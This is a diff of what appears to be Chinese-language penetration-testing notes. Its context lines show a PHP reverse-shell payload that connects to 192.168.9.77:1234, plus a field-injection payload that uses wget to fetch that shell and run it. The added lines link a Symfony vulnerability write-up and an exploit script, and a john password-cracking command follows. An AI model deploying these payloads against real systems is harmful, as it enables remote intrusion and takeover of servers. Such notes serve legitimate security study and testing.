@@ -37,6 +37,10 @@
 3. 先在kali机上进入/var/www/html目录，创建shell.txt文件。然后在shell.txt文件内写入<?php $sock=fsockopen("192.168.9.77",1234);exec("/bin/sh -i <&3 >&3 2>&3");?>
 4. 修改Default Value，设置为<?php system("wget 192.168.9.77/shell.txt -O /tmp/shell.php;php /tmp/shell.php");?>
 
+**Symfony**
+1. https://infosecwriteups.com/how-i-was-able-to-find-multiple-vulnerabilities-of-a-symfony-web-framework-web-application-2b82cd5de144
+2. https://github.com/ambionics/symfony-exploits/blob/main/secret_fragment_exploit.py
+
 **哈希加密**
 1. john工具：
   a. john --wordlist=xxx password.txt (指定字典)
